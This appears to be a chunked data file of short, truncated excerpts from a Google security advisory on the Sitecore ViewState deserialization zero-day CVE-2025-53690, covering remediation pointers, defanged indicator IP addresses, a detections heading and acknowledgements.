+26334546-20_chunk_9,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,814,False,".NET view state security and key management
+Code injection attacks using publicly disclosed ASP.NET machine keys
+For detailed Sitecore remediation instructions, refer to the official Sitecore advisory..."
+26334546-20_chunk_10,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,297,False,"| 130.33.156[.]194:443 |
+| 130.33.156[.]194:8080 |
+| 103.235.46[.]102:80 |
+
+Detections
+Google Security Operations Enterprise and Enterprise+ customers can leverage the following product threat detecti..."
+26334546-20_chunk_11,20,ViewState Deserialization Zero-Day Vulnerability in Sitecore Products (CVE-2025-53690),Google,245,False," to Tom Bennett and Nino Isakovic for their assistance with the payload analysis. We also appreciate the valuable input and technical review provided by Richmond Liclican and Tatsuhiko Ito.
+
+Outbound ..."
